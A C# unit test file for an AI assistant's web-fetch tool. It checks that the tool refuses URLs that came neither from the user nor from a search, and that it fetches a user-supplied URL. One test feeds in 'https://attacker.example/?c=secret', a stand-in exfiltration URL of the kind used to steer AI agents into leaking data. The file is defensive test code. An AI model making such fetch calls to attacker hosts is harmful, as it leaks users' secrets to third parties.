using System.Text.Json;

using FluentAssertions;

using Mediator;

using Microsoft.Extensions.Options;

using Netptune.Ai.Configuration;
using Netptune.Ai.Tools;
using Netptune.Ai.Web;
using Netptune.Core.Services.Ai;

using NSubstitute;

using Xunit;

namespace Netptune.UnitTests.Netptune.Ai;

public class WebFetchToolTests
{
    private readonly IMediator Mediator = Substitute.For<IMediator>();
    private readonly IWebContentFetcher Fetcher = Substitute.For<IWebContentFetcher>();
    private readonly AiWebFetchAllowance Allowance = new();

    [Fact]
    public async Task Execute_ShouldRefuse_AnAddressThatDidNotComeFromTheUserOrASearch()
    {
        var tool = new WebFetchTool(Mediator, Fetcher, Allowance, Options.Create(new AiOptions()));
        var arguments = JsonDocument.Parse("""{"url":"https://attacker.example/?c=secret"}""").RootElement;

        var result = await tool.Execute(arguments, TestContext.Current.CancellationToken);

        result.IsError.Should().BeTrue();
        result.Content.Should().Contain("web_search");
        await Fetcher.DidNotReceive().Fetch(Arg.Any<string>(), Arg.Any<CancellationToken>());
    }

    [Fact]
    public async Task Execute_ShouldFetch_AnAddressTheUserGave()
    {
        Allowance.AllowFromUserText("Please read https://docs.example.com/guide");
        Fetcher
            .Fetch(Arg.Any<string>(), Arg.Any<CancellationToken>())
            .Returns(WebFetchResult.Failed("offline"));

        var tool = new WebFetchTool(Mediator, Fetcher, Allowance, Options.Create(new AiOptions()));
        var arguments = JsonDocument.Parse("""{"url":"https://docs.example.com/guide"}""").RootElement;

        await tool.Execute(arguments, TestContext.Current.CancellationToken);

        await Fetcher.Received(1).Fetch("https://docs.example.com/guide", Arg.Any<CancellationToken>());
    }
}
